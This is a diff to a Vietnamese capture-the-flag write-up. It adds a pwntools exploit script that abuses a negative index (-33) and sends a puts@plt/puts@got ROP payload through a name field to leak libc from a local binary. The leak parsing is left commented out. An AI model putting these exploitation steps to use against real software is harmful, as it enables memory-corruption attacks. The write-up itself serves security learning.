@@ -184,7 +184,7 @@ offset = -33
 ```
 
 Để vào option viết vào `name`:
-```
+```python
 p.recvuntil(b"> ")
 p.sendline(b"6")
 p.recvuntil(b"> ")
@@ -209,6 +209,9 @@ Ta thử xem hướng exploit đúng ko:
 <img width="816" height="692" alt="image" src="https://github.com/user-attachments/assets/8d39853f-bc5b-41d9-acf9-5f51b7f1ddbe" />
 
 ==> Có thể khả thi
+
+Giờ đến bước leak libc và dựng ROP:
+
 ____
 script.py:
 
@@ -222,6 +225,8 @@ def GDB():
 	gdb.attach(p, gdbscript='''
 		br main
 		br *main + 58
+
+		x/4gx 0x080580d0
 		''')
 
 p = process(exe.path)
@@ -229,11 +234,27 @@ GDB()
 
 p.recvuntil(b"> ")
 p.sendline(b"6")
-
 p.recvuntil(b"> ")
 p.sendline(b"2")
 
-p.sendlineafter(b"Enter your name: ")
+puts_plt = exe.plt['puts']
+puts_got = exe.got['puts']
+main_addr = 0x0804a61b
+
+payload = p32(puts_plt) + p32(main_addr) + p32(puts_got)
+p.sendlineafter(b"Enter your name: ", payload)
+
+p.recvuntil(b"> ")
+p.sendline(b"1")
+
+p.recvuntil(b"> ")
+p.sendline(b"-33")
+
+p.recvuntil(b"> ") 
+# leak_raw = p.recv(4)
+# leak = u32(leak_raw)
+
+# print(f"leak: {hex(leak)}")
 
 p.interactive()
 ```
